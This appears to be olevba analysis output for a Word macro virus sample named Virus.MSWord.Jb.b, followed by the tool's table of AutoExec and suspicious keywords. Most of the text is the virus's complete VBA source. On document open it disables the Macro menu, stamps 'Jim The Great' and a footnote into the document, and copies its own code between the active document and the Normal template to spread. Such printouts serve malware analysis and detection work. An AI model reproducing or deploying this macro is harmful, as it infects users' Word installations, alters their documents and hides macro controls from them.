olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jb.b-2ecb3a1cdb73ee52738918d5872ea22d39e73d8e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO JB.cls 
in file: Virus.MSWord.Jb.b-2ecb3a1cdb73ee52738918d5872ea22d39e73d8e - OLE stream: 'Macros/VBA/JB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim prvInfNorm As Boolean
Dim prvInfAct As Boolean
Dim prvCodeCount As Integer
Private Sub Document_Close()
CommandBars("Macro").Enabled = True
End Sub

Private Sub Document_New()
    Document_Open
End Sub

Private Sub Document_Open()


    CommandBars("Macro").Enabled = False
    
    ActiveDocument.Content.InsertAfter "Jim The Great"
    ActiveDocument.Content.Footnotes.Add ActiveDocument.Range, "Jim"

    'Check The Name of the Normal Template and Active Document Projects
    If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "JB" Then
        NormalTemplate.VBProject.VBComponents.Item(1).Name = "JB"
        prvInfNorm = True 'Infect Normal
    Else
        prvInfNorm = False ' Don't Infect Normal
    End If
    If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "JB" Then
        ActiveDocument.VBProject.VBComponents.Item(1).Name = "JB"
        prvInfAct = True 'Infect Active Document
    Else
        prvInfAct = False 'Don't Infect Active Document
    End If

    'Infecting the Normal Template
    If prvInfNorm = True Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        For prvCodeCount = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines prvCodeCount, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(prvCodeCount, 1)
        Next prvCodeCount
    End If

    ' Infecting the Active Document
    If prvInfAct = True Then
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        For prvCodeCount = 1 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines prvCodeCount, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(prvCodeCount, 1)
        Next prvCodeCount
    End If

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

